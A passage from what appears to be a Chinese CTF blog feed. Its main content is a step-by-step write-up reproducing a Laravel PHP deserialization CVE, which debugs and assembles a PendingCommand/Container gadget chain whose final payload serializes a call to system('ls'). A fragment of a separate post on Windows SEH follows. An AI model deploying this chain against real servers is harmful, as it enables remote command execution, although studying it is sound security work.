class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = [<span class="hljs-string">&#x27;1&#x27;</span>];<span class="hljs-comment">//è¿™é‡Œç”¨æ•°ç»„æ˜¯å› ä¸ºåŸè°ƒç”¨å‡ºä¼šæœ‰ä¸€ä¸ªforeachéå†</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>\<span class="hljs-title class_">PendingCommand</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PendingCommand</span>(<span class="hljs-string">&#x27;system&#x27;</span>,[<span class="hljs-string">&#x27;ls&#x27;</span>])));<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨<code>Faker\DefaultGenerator\DefaultGenerator</code>æ¥ä¸º<code>test</code> å’Œ<code>app</code>èµ‹å€¼æ˜¯å› ä¸ºè¿™ç±»çš„<code>__call()``__get()</code>æ–¹æ³•éƒ½æ¯”è¾ƒç®€å•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$attribute</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $method</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> array $attributes</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥æŠ¥é”™</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310072022713.png"></p><p>é—®é¢˜å‡ºåœ¨è¿™ä¸€å¥<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code></p><p>ä¹Ÿå°±æ˜¯ä¹‹å‰æˆ‘ä»¬å¯¹<code>app</code>çš„èµ‹å€¼æœ‰é—®é¢˜ï¼Œè¿™é‡Œä¼šæŠŠ<code>app</code>å½“åšä¸€ä¸ªæ•°ç»„æ¥æ‰§è¡Œï¼Œè¿”å›å»æŸ¥çœ‹appçš„è¯´æ˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * The application instance.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@var</span> \Illuminate\Foundation\Application</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>$app</code>æ˜¯<code> \Illuminate\Foundation\Application</code>çš„å®ä¾‹ï¼Œä¿®æ”¹ä¸€ä¸‹Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>\<span class="hljs-title">Application</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingCommand</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Application</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>  <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Application</span>&#123;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = [<span class="hljs-string">&#x27;1&#x27;</span>];<span class="hljs-comment">//è¿™é‡Œç”¨æ•°ç»„æ˜¯å› ä¸ºåŸè°ƒç”¨å‡ºä¼šæœ‰ä¸€ä¸ªforeachéå†</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>\<span class="hljs-title class_">PendingCommand</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PendingCommand</span>(<span class="hljs-string">&#x27;system&#x27;</span>,[<span class="hljs-string">&#x27;ls&#x27;</span>])));<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ç»§ç»­æŠ¥é”™</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310072020182.png"></p><p>æç¤º<code>Target [Illuminate\Contracts\Console\Kernel] is not instantiable</code>,ä¹Ÿå°±æ˜¯è¯´<code>[Illuminate\Contracts\Console\Kernel]</code>è¿™ä¸ªä¸œè¥¿å¯¹åº”çš„ç±»æ— æ³•è¢«å®ä¾‹åŒ–ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å•æ­¥è°ƒè¯•çœ‹çœ‹</p><p>æœ€ç»ˆåœ¨<code>Illuminate\Container\Container.php</code>çš„<code>if ($this-&gt;isBuildable($concrete, $abstract))</code>æ–¹æ³•æŠ¥é”™</p><p>ç›¸å…³ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-variable">$concrete</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getConcrete</span>(<span class="hljs-variable">$abstract</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isBuildable</span>(<span class="hljs-variable">$concrete</span>, <span class="hljs-variable">$abstract</span>)) &#123;<br>  <span class="hljs-variable">$object</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">build</span>(<span class="hljs-variable">$concrete</span>);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$object</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">make</span>(<span class="hljs-variable">$concrete</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>$abstract</code>å°±æ˜¯<code>Illuminate\Contracts\Console\Kernel</code>è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯æœ€å‰é¢çš„<code>Kernel::class</code>æ‰€å¯¹åº”çš„å­—ç¬¦ä¸²</p><p>æ¥çœ‹çœ‹è¿™å‡ ä¸ªæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConcrete</span>(<span class="hljs-params"><span class="hljs-variable">$abstract</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$concrete</span> = <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getContextualConcrete</span>(<span class="hljs-variable">$abstract</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$concrete</span>;<br>    &#125;<br>    <span class="hljs-comment">// If we don&#x27;t have a registered resolver or concrete for the type, we&#x27;ll just</span><br>    <span class="hljs-comment">// assume each type is a concrete name and will attempt to resolve it as is</span><br>    <span class="hljs-comment">// since the container should be able to resolve concretes automatically.</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;bindings[<span class="hljs-variable">$abstract</span>])) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;bindings[<span class="hljs-variable">$abstract</span>][<span class="hljs-string">&#x27;concrete&#x27;</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$abstract</span>;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isBuildable</span>(<span class="hljs-params"><span class="hljs-variable">$concrete</span>, <span class="hljs-variable">$abstract</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$concrete</span> === <span class="hljs-variable">$abstract</span> || <span class="hljs-variable">$concrete</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Closure</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>(<span class="hljs-params"><span class="hljs-variable">$concrete</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$concrete</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Closure</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$concrete</span>(<span class="hljs-variable language_">$this</span>, <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getLastParameterOverride</span>());<br>    &#125;<br><br>    <span class="hljs-variable">$reflector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-variable">$concrete</span>);<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-variable">$reflector</span>-&gt;<span class="hljs-title function_ invoke__">isInstantiable</span>()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">notInstantiable</span>(<span class="hljs-variable">$concrete</span>);<br>    &#125;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;buildStack[] = <span class="hljs-variable">$concrete</span>;<br><br>    <span class="hljs-variable">$constructor</span> = <span class="hljs-variable">$reflector</span>-&gt;<span class="hljs-title function_ invoke__">getConstructor</span>();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$constructor</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$this</span>-&gt;buildStack);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$concrete</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$dependencies</span> = <span class="hljs-variable">$constructor</span>-&gt;<span class="hljs-title function_ invoke__">getParameters</span>();<br>    <span class="hljs-variable">$instances</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resolveDependencies</span>(<br>        <span class="hljs-variable">$dependencies</span><br>    );<br><br>    <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$this</span>-&gt;buildStack);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$reflector</span>-&gt;<span class="hljs-title function_ invoke__">newInstanceArgs</span>(<span class="hljs-variable">$instances</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œå…¶å®å°±å·²ç»äº†ç„¶äº†ã€‚</p><p>å­—ç¬¦ä¸²<code>Illuminate\Contracts\Console\Kernel</code>ä½œä¸º<code>$this-&gt;bindings</code>çš„é”®å€¼ï¼Œå»å–å¦ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä»å¦ä¸€ä¸ªæ•°ç»„ä¸­ä»¥é”®å€¼<code>concrete</code>å–å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œå¦åˆ™å°±è¿”å›<code>Illuminate\Contracts\Console\Kernel</code>ï¼Œç„¶åå»<code>build</code>ä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹‹å‰ç»™<code>app</code>ä¼ å…¥çš„å¯¹è±¡æ˜¾ç„¶ä¸èƒ½å®ä¾‹åŒ–ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰æ²¡æœ‰å¯¹<code>bindings</code>èµ‹å€¼ï¼Œä¼ è¿›å»çš„<code>concrete</code>æ˜¯å­—ç¬¦ä¸²<code>Illuminate\Contracts\Console\Kernel</code></p><p>æ‰€ä»¥æˆ‘ä»¬å°±å¾—ä¸º<code>app</code>çš„å€¼æ„é€ ä¸€ä¸‹ã€‚</p><p>å…ˆæ¥çœ‹çœ‹æˆ‘ä»¬éœ€è¦ä»€ä¹ˆï¼Œæˆ‘ä»¬éœ€è¦<code>app</code>æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œ[<code>Illuminate\Contracts\Console\Kernel</code>] &#x3D;&gt; [<code>concrete</code> &#x3D;&gt; ä¸€ä¸ªå¯ä»¥å®ä¾‹åŒ–çš„ç±»]ï¼Œå¹¶ä¸”è¿™ä¸ªç±»è¿˜å¾—æœ‰callæ–¹æ³•ï¼Œå› ä¸ºæœ€ç»ˆè¿”å›çš„å°±æ˜¯ä¸€ä¸ªè¯¥ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œç„¶åè°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„<code>call</code>æ–¹æ³•</p><p>æœ€åå‘ç°å°±æ˜¯</p><p><code>Illuminate\Container</code>ä¸‹çš„<code>Container</code>ç±»å¥½ç”¨ï¼Œä¸ä»…æœ‰<code>bindings</code>å±æ€§ï¼Œè¿˜æœ‰<code>call</code>æ–¹æ³•</p><p>äºæ˜¯å†ä¿®æ”¹payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span>  <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Container</span>\<span class="hljs-title">Container</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingCommand</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Container</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = [<span class="hljs-string">&#x27;1&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Container</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Container</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">bindings</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bindings = [<span class="hljs-string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span> =&gt; [<span class="hljs-string">&#x27;concrete&#x27;</span> =&gt; <span class="hljs-string">&#x27;Illuminate\Container\\Container&#x27;</span>]];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>\<span class="hljs-title class_">PendingCommand</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PendingCommand</span>(<span class="hljs-string">&#x27;system&#x27;</span>,[<span class="hljs-string">&#x27;ls&#x27;</span>])));<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æˆåŠŸæ‰“é€š</p><h2 id="2-åè®°"><a href="#2-åè®°" class="headerlink" title="2.åè®°"></a>2.åè®°</h2><p>1.åˆ¤æ–­å“ªé‡Œæœ‰é—®é¢˜å°±çœ‹ç¨‹åºåœ¨å“ªé‡Œcrushæ‰ï¼Œä¹Ÿå°±æ˜¯ç±»ä¼¼äºè¿›å…¥<code>catch</code>å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$passable</span></span>) <span class="hljs-keyword">use</span> (<span class="hljs-params"><span class="hljs-variable">$destination</span></span>) </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$destination</span>(<span class="hljs-variable">$passable</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleException</span>(<span class="hljs-variable">$passable</span>, <span class="hljs-variable">$e</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleException</span>(<span class="hljs-variable">$passable</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FatalThrowableError</span>(<span class="hljs-variable">$e</span>));<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>2.åŠ¨æ€è°ƒè¯•è¿˜æ˜¯æ¯”è¾ƒé‡è¦çš„ï¼Œä¸éœ€è¦ç†è§£æ¯ä¸€æ­¥å…·ä½“æ˜¯åœ¨å¹²ä»€ä¹ˆï¼Œä½†é€šè¿‡æ³¨é‡Šï¼Œå˜é‡åå­—å¤§ä½“éƒ½å¯ä»¥çŒœåˆ°æ˜¯åœ¨å¹²ä»€ä¹ˆ</p><p>3.ä¸€æ­¥ä¸€æ­¥å¤ç°æˆåŠŸï¼Œè¿˜æ˜¯å¾ˆå¼€å¿ƒå“’ï¼</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>unserialize</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>unserialize</tag>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SEHç¬”è®°</title>
    <link href="/2023/08/23/SEH/"/>
    <url>/2023/08/23/SEH/</url>
    
    <content type="html"><![CDATA[<p>æµ…è°ˆSEH</p><span id="more"></span><p>â€‹ä»å»å¹´çš„moectfåˆ°ä»Šå¹´çš„moectfï¼Œä»¥åŠå¹³æ—¥çš„åˆ·é¢˜éƒ½é‡åˆ°äº†SEHçš„é¢˜ç›®ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰ç³»ç»Ÿçš„å­¦ä¹ æ€»ç»“ã€‚æ­£å·§æœ€è¿‘ä¹Ÿåœ¨çœ‹ã€ŠåŠ å¯†ä¸è§£å¯†ã€‹è¿™æœ¬ä¹¦ï¼Œä¹Ÿçœ‹åˆ°äº†SEHç›¸å…³å†…å®¹ã€‚å°±å€Ÿç€ä»Šå¹´çš„moectfæ¥æ€»ç»“ä¸€ä¸‹SEHå§ï¼</p><h1 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h1><h2 id="ä»€ä¹ˆæ˜¯SEH"><a href="#ä»€ä¹ˆæ˜¯SEH" class="headerlink" title="ä»€ä¹ˆæ˜¯SEH"></a>ä»€ä¹ˆæ˜¯SEH</h2><p>â€‹SEHå…¨ç§°Structured Exception Handlingï¼Œå³ç»“æ„åŒ–å¤„ç†å¼‚å¸¸ã€‚æ˜¯ä¸€ç§å½“ä»£ç äº§ç”Ÿå¼‚å¸¸æä¾›çº é”™æœºä¼šçš„æœºåˆ¶ï¼Œæ¯”å¦‚è®¿é—®éæ³•åœ°å€ï¼Œå‘ç”Ÿé™¤0é”™è¯¯å°±å»ä¿®æ­£åœ°å€ã€ä¿®æ­£é™¤æ•°ç­‰ã€‚æ¢å¥è¯è¯´ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿå¼‚å¸¸çš„æ—¶å€™ç³»ç»Ÿä¼šè°ƒç”¨ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„å›è°ƒå‡½æ•°ï¼Œæ­¤å›è°ƒå‡½æ•°çš„ä¸»è¦ä½œç”¨å°±æ˜¯ä¿®æ­£é”™è¯¯ï¼Œè®©ä»£ç é‡æ–°æ­£å¸¸è¿è¡Œã€‚</p><p>ä¸å¦¨å…ˆçœ‹çœ‹è¿™ä¸ªå›è°ƒå‡½æ•°æ ·å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">EXCEPTION_DISPOSITION<br>__cdecl _except_handler( <span class="hljs-keyword">struct</span> _EXCEPTION_RECORD *ExceptionRecord,<br>                        <span class="hljs-type">void</span> * EstablisherFrame,<br>                        <span class="hljs-keyword">struct</span> _CONTEXT *ContextRecord,<br>                        <span class="hljs-type">void</span> * 